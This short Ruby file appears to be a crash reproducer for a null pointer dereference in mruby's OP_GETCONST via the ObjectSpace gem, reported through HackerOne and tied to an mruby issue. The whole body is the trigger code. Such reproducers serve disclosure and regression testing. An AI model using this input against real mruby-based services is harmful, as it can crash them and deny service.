# Null pointer dereference in OP_GETCONST (ObjectSpace gem)
# Issue: https://github.com/mruby/mruby/issues/3803
# Reported via hackerone

def method_missing(*)
proc{}
end

ObjectSpace.each_object{|a = 1;obj|[ObjectSpace.each_object{1&a.initialize_copy(a.length)|obj| obj}] rescue a = nil;class << a;def self.b;6;end;end;0}
